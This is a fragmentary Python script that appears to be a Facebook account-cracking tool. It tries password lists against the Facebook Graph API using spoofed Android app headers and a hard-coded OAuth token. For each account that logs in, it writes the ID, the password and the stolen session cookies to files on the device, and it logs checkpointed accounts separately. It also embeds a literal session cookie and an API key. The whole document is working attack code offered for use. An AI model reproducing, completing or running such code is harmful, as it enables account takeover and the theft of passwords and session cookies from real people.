...
"api_key": "882a8490361da98702bf97a021ddc14d",}
    ...
    # 'cookie': 'datr=Wi54ZqeDv0EZhKZJIu0Sp0X9; sb=Wi54Zpsu4Vd_2RTs-SzxzCuS; m_pixel_ratio=2.1701366901397705; wd=498x975; fr=04q0O5STVFOpcSX0X..BmeC5a..AAA.0.0.BmeC5o.AWUEkPeZ5dk',
    ...
    'viewport-width': '980',
                        ...
                        if 'session_key' in po:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/ANKIT-COKI.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/ANKIT-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break                     
                        elif 'www.facebook.com' in po['error']['message']:
...
# Update this with the actual folder path
...
try:
	...
	pass
def uaa():
    # Define a user-agent string generator or provide a static one if necessary
    return "[FBAN/FB4A;FBAV/" + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ";FBBV/" + str(random.randint(1111111, 7777777)) + ";[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097190;FBDM/{density=1.5,width=540,height=960};FBLC/es_ES;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J200M;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
...
def api5(ids,names,passlist):
	try:
		...
		for pw in passlist:
			...
			head = {'User-Agent':ONE(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
...
def api4(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [ANKIT-M4] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [ANKIT-OK] '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m') 
                                        print("\033[1;96m [BISCUT-🍪] :\033[1;37m "+coki)           
                                        open('/sdcard/ANKIT_m2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/ANKIT_iDs_COOKiE_M4.txt','a').write(ids+'|'+pas+'|'+coki+'\n')                                        
                                        oks.append(ids)                                        
                                        break
                                                                                  
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [ANKIT-CP] '+ids+' | '+pas+'\033[1;97m') 
                                                open('/sdcard/ANKIT-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)                                                 
                                                break
                                        else:
                                                open('/sdcard/ANKIRbrand-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
